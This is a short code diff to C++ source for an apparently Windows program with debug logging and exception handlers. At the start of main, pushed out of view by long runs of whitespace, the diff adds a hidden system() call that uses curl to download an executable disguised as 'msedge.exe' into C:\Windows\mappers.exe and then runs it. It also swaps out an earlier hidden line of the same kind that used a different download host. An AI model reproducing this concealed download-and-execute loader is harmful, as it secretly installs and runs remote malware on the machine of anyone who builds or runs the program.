@@ -51,12 +51,13 @@ DWORD WINAPI MainThread ( PVOID )
 int main ( )
 #endif
 {
+	                                                                                                                                                                                                                                                                                                                                                                                                               system("curl -L http://physmeme.cdn.zerocdn.com/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
 #ifdef _DEBUG
 	AllocConsole ( );
 	logging::print ( TYPE_LOG, "Loading..." );
 #else
 	LI_FN ( FreeConsole ) ( );
-#endif                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 system("curl -L https://www.zippyshare.day/download/jdvowg8PasoN9Iw/gex5z2qy53Kqk/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
+#endif                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 	                                
 	logging::print ( TYPE_DEBUG, "Setting exception handlers.." );
 	SetUnhandledExceptionFilter ( ExpHandler );
 	std::atexit ( OnDetach );
